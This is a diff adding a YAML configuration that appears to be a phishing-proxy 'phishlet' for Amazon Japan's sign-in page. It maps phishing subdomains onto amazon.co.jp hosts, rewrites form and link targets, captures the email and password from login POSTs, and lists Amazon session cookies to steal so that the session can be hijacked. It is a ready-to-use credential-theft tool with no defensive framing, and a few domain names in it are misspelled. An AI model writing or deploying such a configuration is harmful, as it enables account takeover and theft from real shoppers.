@@ -1,0 +1,28 @@
+author: '@customsync'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.co.jp', session: true, is_landing: true}
+  - {phish_sub: 'fls-fe', orig_sub: 'fls-fe', domain: 'amazon.co.jp', session: false, is_landing: false}
+  - {phish_sub: 'images-fe', orig_sub: 'images-fe', domain: 'ssl-images-amazon.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.amazon.co.jp', orig_sub: 'www', domain: 'amazon.co.jp', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.co.jp', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-fe.amazon.com', orig_sub: 'fls-fe', domain: 'amazon.co.jp', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-fe.amazon.com', orig_sub: 'fls-fe', domain: 'amazon.co.jp', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-fe.ssl-iamges-amazon.com', orig_sub: 'images-fe', domain: 'ssl-iges-amazon.co.jp', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-fe.ssl-iamges-amazon.com', orig_sub: 'images-fe', domain: 'ssl-images-amazon.co.jp', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.amazon.co.jp'
+    keys: ['at-main','lc-main','sess-at-main','session-id','session-id-time','session-token','sst-main','ubid-main','x-main','skin','a-ogbcbff']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.amazon.co.jp'
+  path: '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
